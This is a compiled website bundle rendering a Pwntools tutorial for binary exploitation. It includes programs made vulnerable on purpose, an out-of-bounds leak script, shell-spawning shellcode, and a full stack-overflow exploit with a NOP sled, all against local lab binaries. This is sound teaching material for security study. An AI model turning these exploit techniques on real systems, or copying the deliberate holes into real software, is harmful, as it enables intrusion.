"use strict";(self.webpackChunkbinary_security=self.webpackChunkbinary_security||[]).push([[3867],{5680:(e,n,t)=>{t.d(n,{xA:()=>c,yg:()=>f});var a=t(6540);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function r(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?r(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):r(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,o=function(e,n){if(null==e)return{};var t,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)t=r[a],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)t=r[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var s=a.createContext({}),p=function(e){var n=a.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(s.Provider,{value:n},e.children)},d="mdxType",g={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},u=a.forwardRef((function(e,n){var t=e.components,o=e.mdxType,r=e.originalType,s=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=p(t),u=o,f=d["".concat(s,".").concat(u)]||d[u]||g[u]||r;return t?a.createElement(f,l(l({ref:n},c),{},{components:t})):a.createElement(f,l({ref:n},c))}));function f(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var r=t.length,l=new Array(r);l[0]=u;var i={};for(var s in n)hasOwnProperty.call(n,s)&&(i[s]=n[s]);i.originalType=e,i[d]="string"==typeof e?e:o,l[1]=i;for(var p=2;p<r;p++)l[p]=t[p];return a.createElement.apply(null,l)}return a.createElement.apply(null,t)}u.displayName="MDXCreateElement"},2370:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>l,default:()=>g,frontMatter:()=>r,metadata:()=>i,toc:()=>p});var a=t(8168),o=(t(6540),t(5680));const r={},l="Pwntools Tutorial",i={unversionedId:"Extra/Pwntool Intro/Reading/README",id:"Extra/Pwntool Intro/Reading/README",title:"Pwntools Tutorial",description:"Even though pwntools is an excellent CTF framework, it is also an exploit development library.",source:"@site/docs/Extra/Pwntool Intro/Reading/README.md",sourceDirName:"Extra/Pwntool Intro/Reading",slug:"/Extra/Pwntool Intro/Reading/",permalink:"/binary-security/Extra/Pwntool Intro/Reading/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Pwntool Intro",permalink:"/binary-security/Extra/Pwntool Intro/"}},s={},p=[{value:"Installation",id:"installation",level:2},{value:"Local and Remote I/O",id:"local-and-remote-io",level:2},{value:"Logging",id:"logging",level:2},{value:"Assembly and ELF manipulation",id:"assembly-and-elf-manipulation",level:2},{value:"Shellcode generation",id:"shellcode-generation",level:2},{value:"GDB integration",id:"gdb-integration",level:2}],c={toc:p},d="wrapper";function g(e){let{components:n,...t}=e;return(0,o.yg)(d,(0,a.A)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,o.yg)("h1",{id:"pwntools-tutorial"},"Pwntools Tutorial"),(0,o.yg)("p",null,"Even though pwntools is an excellent CTF framework, it is also an exploit development library.\nIt was developed by ",(0,o.yg)("inlineCode",{parentName:"p"},"Gallopsled"),", a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations.\nPwntools comes to level the playing field and bring together developers to create a common framework of tools."),(0,o.yg)("h2",{id:"installation"},"Installation"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-console"},"pip install -U pwntools\n")),(0,o.yg)("h2",{id:"local-and-remote-io"},"Local and Remote I/O"),(0,o.yg)("p",null,"Pwntools enables you to dynamically interact (through scripting) with either local or remote processes, as follows:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"IP = '10.11.12.13'\nPORT = 1337\nlocal = False\nif not local:\n    io = remote(IP, PORT)\nelse:\n    io = process('/path/to/binary')\n\nio.interactive()\n")),(0,o.yg)("p",null,"We can send and receive data from a local or remote process via ",(0,o.yg)("inlineCode",{parentName:"p"},"send"),", ",(0,o.yg)("inlineCode",{parentName:"p"},"sendline"),", ",(0,o.yg)("inlineCode",{parentName:"p"},"recv"),", ",(0,o.yg)("inlineCode",{parentName:"p"},"recvline"),", ",(0,o.yg)("inlineCode",{parentName:"p"},"recvlines")," and ",(0,o.yg)("inlineCode",{parentName:"p"},"recvuntil"),"."),(0,o.yg)("p",null,"Let's construct a complete example in which we interact with a local process."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-c"},"#include <stdio.h>\n\nint main(int argc, char* argv[])\n{\n    char flag[10] = {'S', 'E', 'C', 'R', 'E', 'T', 'F', 'L', 'A', 'G'};\n    char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};\n    int index = 0;\n\n    while (1) {\n        printf(\"Give me an index and I'll tell you what's there!\\n\");\n        scanf(\"%d\", &index);\n        printf(\"Okay, here you go: %p %c\\n\", &digits[index], digits[index]);\n    }\n    return 0;\n}\n")),(0,o.yg)("p",null,"Let's leak one byte of the flag using pwntools."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python\nfrom pwn import *\n\nio = process('leaky')\n\n# \"Give me an index and I'll tell you what's there!\\n\nio.recvline()\n\n# Send offset -10\nio.sendline('-10')\n\n# Here you go\\n\nresult = io.recvline()\n\nprint(b\"Got: \" + result)\n\nio.interactive()\n")),(0,o.yg)("p",null,"If we run the previous script, we get the following output:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-text"},"[+] Starting local process './leaky': Done\nGot: Okay, here you go: 0xffe947d8 S\n\n[*] Switching to interactive mode\n[*] Process './leaky' stopped with exit code 0\n[*] Got EOF while reading in interactive\n$\n")),(0,o.yg)("p",null,"Notice the ",(0,o.yg)("inlineCode",{parentName:"p"},"$")," prompt which still awaits input from us to feed the process.\nThis is due to the ",(0,o.yg)("inlineCode",{parentName:"p"},"io.interactive()")," line at the end of the script."),(0,o.yg)("p",null,"We can encapsulate the previous sequence of interactions inside a function which we can loop."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python\nfrom pwn import *\n\ndef leak_char(offset):\n    # \"Give me an index and I'll tell you what's there!\\n\n    io.recvline()\n\n    # Send offset\n    io.sendline(str(offset))\n\n    # Here you go\\n\n    result = io.recvline()\n\n    # Parse the result\n    leaked_char = result.split(b'go: ')[1].split(b' ')[1].split(b'\\n')[0]\n    return leaked_char\n\nio = process('leaky')\n\nflag = ''\n\nfor i in range(-10,0):\n    flag += leak_char(i).decode(\"utf-8\")\n\nprint(\"The flag is: \" + flag)\nio.close()\n")),(0,o.yg)("p",null,"If we run this script, we leak the flag."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-bash"},"$ ./demo_pwn.py\n[+] Starting local process './leaky': Done\nThe flag is: SECRETFLAG\n[*] Stopped program './leaky'\n")),(0,o.yg)("h2",{id:"logging"},"Logging"),(0,o.yg)("p",null,"The previous example was a bit... quiet.\nFortunately, pwntools has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes.\nLet's log each of our steps within the ",(0,o.yg)("inlineCode",{parentName:"p"},"leak_char")," function."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"def leak_char(offset):\n    # \"Give me an index and I'll tell you what's there!\\n\n    io.recvline()\n\n    # Send offset\n    log.info(\"Sending request for offset: \" + str(offset))\n    io.sendline(str(offset))\n\n    # Here you go\\n\n    result = io.recvline()\n    log.info(\"Got back raw response: {}\".format(result))\n\n    # Parse the result\n    leaked_char = result.split(b'go: ')[1].split(b' ')[1].split(b'\\n')[0]\n    log.info(\"Parsed char: {}\".format(leaked_char))\n    return leaked_char\n")),(0,o.yg)("p",null,"Now the output should be much more verbose:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-text"},"[+] Starting local process './leaky': Done\n[*] Sending request for offset: -10\n[*] Got back raw response: Okay, here you go: 0xffb14948 S\n[*] Parsed char: S\n[*] Sending request for offset: -9\n[*] Got back raw response: Okay, here you go: 0xffb14949 E\n[*] Parsed char: E\n[*] Sending request for offset: -8\n[*] Got back raw response: Okay, here you go: 0xffb1494a C\n[*] Parsed char: C\n[*] Sending request for offset: -7\n[*] Got back raw response: Okay, here you go: 0xffb1494b R\n[*] Parsed char: R\n[*] Sending request for offset: -6\n[*] Got back raw response: Okay, here you go: 0xffb1494c E\n[*] Parsed char: E\n[*] Sending request for offset: -5\n[*] Got back raw response: Okay, here you go: 0xffb1494d T\n[*] Parsed char: T\n[*] Sending request for offset: -4\n[*] Got back raw response: Okay, here you go: 0xffb1494e F\n[*] Parsed char: F\n[*] Sending request for offset: -3\n[*] Got back raw response: Okay, here you go: 0xffb1494f L\n[*] Parsed char: L\n[*] Sending request for offset: -2\n[*] Got back raw response: Okay, here you go: 0xffb14950 A\n[*] Parsed char: A\n[*] Sending request for offset: -1\n[*] Got back raw response: Okay, here you go: 0xffb14951 G\n[*] Parsed char: G\n[*] The flag is: SECRETFLAG\n[*] Stopped program './leaky'\n")),(0,o.yg)("h2",{id:"assembly-and-elf-manipulation"},"Assembly and ELF manipulation"),(0,o.yg)("p",null,"Pwntools can also be used for precision work, like working with ELF files and their symbols."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python\nfrom pwn import *\n\nleaky_elf = ELF('leaky')\nmain_addr = leaky_elf.symbols['main']\n\n# Print address of main\nlog.info(\"Main at: \" + hex(main_addr))\n\n# Disassemble the first 14 bytes of main\nlog.info(disasm(leaky_elf.read(main_addr, 14), arch='x86'))\n")),(0,o.yg)("p",null,"We can also write ELF files from raw assembly;\nthis is very useful for testing shellcodes."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python\nfrom pwn import *\n\nsh_shellcode = """\n        mov eax, 11\n        push 0\n        push 0x68732f6e\n        push 0x69622f2f\n        mov ebx, esp\n        mov ecx, 0\n        mov edx, 0\n        int 0x80\n"""\n\ne = ELF.from_assembly(sh_shellcode, vma=0x400000)\n\nwith open(\'test_shell\', \'wb\') as f:\n    f.write(e.get_data())\n')),(0,o.yg)("p",null,"This will result in a binary named ",(0,o.yg)("inlineCode",{parentName:"p"},"test_shell")," which executes the necessary assembly code to spawn a shell:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-console"},"chmod u+x test_shell\n./test_shell\n")),(0,o.yg)("h2",{id:"shellcode-generation"},"Shellcode generation"),(0,o.yg)("p",null,"Pwntools comes with the ",(0,o.yg)("inlineCode",{parentName:"p"},"shellcraft")," module, which is quite extensive in its capabilities."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"print(shellcraft.read(0, 0xffffeeb0, 20)) # Construct a shellcode which reads from stdin to a buffer on the stack 20 bytes\n    /* call read(0, 0xffffeeb0, 0x14) */\n    push (SYS_read) /* 3 */\n    pop eax\n    xor ebx, ebx\n    push 0xffffeeb0\n    pop ecx\n    push 0x14\n    pop edx\n    int 0x80\n")),(0,o.yg)("p",null,"It also works with other architectures:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"print(shellcraft.arm.read(0, 0xffffeeb0, 20))\n    /* call read(0, 4294962864, 20) */\n    eor  r0, r0 /* 0 (#0) */\n    movw r1, #0xffffeeb0 & 0xffff\n    movt r1, #0xffffeeb0 >> 16\n    mov  r2, #0x14\n    mov  r7, #(SYS_read) /* 3 */\n    svc  0\n\nprint(shellcraft.mips.read(0, 0xffffeeb0, 20))\n    /* call read(0, 0xffffeeb0, 0x14) */\n    slti $a0, $zero, 0xFFFF /* $a0 = 0 */\n    li $a1, 0xffffeeb0\n    li $t9, ~0x14\n    not $a2, $t9\n    li $t9, ~(SYS_read) /* 0xfa3 */\n    not $v0, $t9\n    syscall 0x40404\n")),(0,o.yg)("p",null,"These shellcodes can be directly assembled using asm inside your script, and given to the exploited process via the ",(0,o.yg)("inlineCode",{parentName:"p"},"send*")," functions."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"  shellcode = asm('''\n       mov rdi, 0\n       mov rax, 60\n       syscall\n''', arch = 'amd64')\n")),(0,o.yg)("p",null,"Most of the time you'll be working with as specific vulnerable program.\nTo avoid specifying architecture for the ",(0,o.yg)("inlineCode",{parentName:"p"},"asm()")," function or to ",(0,o.yg)("inlineCode",{parentName:"p"},"shellcraft()")," you can define the context at the start of the script which will imply the architecture from the binary header."),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},"context.binary = './vuln_program'\n\nshellcode = asm('''\n      mov rdi, 0\n      mov rax, 60\n      syscall\n''')\nprint(shellcraft.sh())\n")),(0,o.yg)("h2",{id:"gdb-integration"},"GDB integration"),(0,o.yg)("p",null,"Most importantly, pwntools provides GDB integration, which is extremely useful."),(0,o.yg)("p",null,"Let's follow an example using the following program:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-asm"},'extern gets\nextern printf\n\nsection .data\nformatstr: db "Enjoy your leak: %p",0xa,0\n\nsection .text\nglobal main\nmain:\n    push rbp\n    mov rbp, rsp\n    sub rsp, 64\n    lea rbx, [rbp - 64]\n    mov rsi, rbx\n    mov rdi, formatstr\n    call printf\n    mov rdi, rbx\n    call gets\n    leave\n    ret\n')),(0,o.yg)("p",null,"Compile it with:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-console"},"nasm vuln.asm -felf64\ngcc -no-pie -fno-pic  -fno-stack-protector -z execstack vuln.o -o vuln\n")),(0,o.yg)("p",null,"Use this script to exploit the program:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python\nfrom pwn import *\n\nret_offset = 72\nbuf_addr = 0x7fffffffd710\nret_address = buf_addr+ret_offset+16\n\n# This sets several relevant things in the context (such as endianess,\n# architecture etc.), based on the given binary\'s properties.\n# We could also set them manually:\n# context.arch = "amd64"\ncontext.binary = "vuln"\np = process("vuln")\n\n\npayload = b""\n# Garbage\npayload += ret_offset * b"A"\n\n# Overwrite ret_address, taking endianness into account\npayload += pack(ret_address)\n\n# Add nopsled\nnops = asm("nop")*100\n\npayload += nops\n\n# Assemble a shellcode from \'shellcraft\' and append to payload\nshellcode = asm(shellcraft.sh())\npayload += shellcode\n\n# Attach to process\ngdb.attach(p)\n\n# Wait for breakpoints, commands etc.\nraw_input("Send payload?")\n\n# Send payload\np.sendline(payload)\n\n# Enjoy shell :-)\np.interactive()\n')),(0,o.yg)("p",null,"Notice the ",(0,o.yg)("inlineCode",{parentName:"p"},"gdb.attach(p)")," and raw_input lines.\nThe former will open a new terminal window with GDB already attached.\nAll of your GDB configurations will be used, so this works with PEDA as well.\nLet's set a breakpoint at the ",(0,o.yg)("inlineCode",{parentName:"p"},"ret")," instruction from the main function:"),(0,o.yg)("pre",null,(0,o.yg)("code",{parentName:"pre",className:"language-gdb"},"gdb-peda$ pdis main\nDump of assembler code for function main:\n   0x08048440 <+0>: push   ebp\n   0x08048441 <+1>: mov    ebp,esp\n   0x08048443 <+3>: sub    esp,0x40\n   0x08048446 <+6>: lea    ebx,[ebp-0x40]\n   0x08048449 <+9>: push   ebx\n   0x0804844a <+10>:    push   0x804a020\n   0x0804844f <+15>:    call   0x8048300 <printf@plt>\n   0x08048454 <+20>:    push   ebx\n   0x08048455 <+21>:    call   0x8048310 <gets@plt>\n   0x0804845a <+26>:    add    esp,0x4\n   0x0804845d <+29>:    leave\n   0x0804845e <+30>:    ret\n   0x0804845f <+31>:    nop\nEnd of assembler dump.\ngdb-peda$ b *0x0804845e\nBreakpoint 1 at 0x804845e\ngdb-peda$ c\nContinuing.\n")),(0,o.yg)("p",null,"The continue command will return control to the terminal in which we're running the pwntools script.\nThis is where the ",(0,o.yg)("inlineCode",{parentName:"p"},"raw_input()")," function comes in handy, because it will wait for you to say",(0,o.yg)("inlineCode",{parentName:"p"},"\u201cgo")," before proceeding further.\nNow if you hit ",(0,o.yg)("inlineCode",{parentName:"p"},"<Enter>")," at the ",(0,o.yg)("inlineCode",{parentName:"p"},"Send payload?")," prompt, you will notice that GDB has reached the breakpoint you've previously set."),(0,o.yg)("p",null,"You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly.\nOnce you reach int ",(0,o.yg)("inlineCode",{parentName:"p"},"0x80"),", you can continue again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session."))}g.isMDXComponent=!0}}]);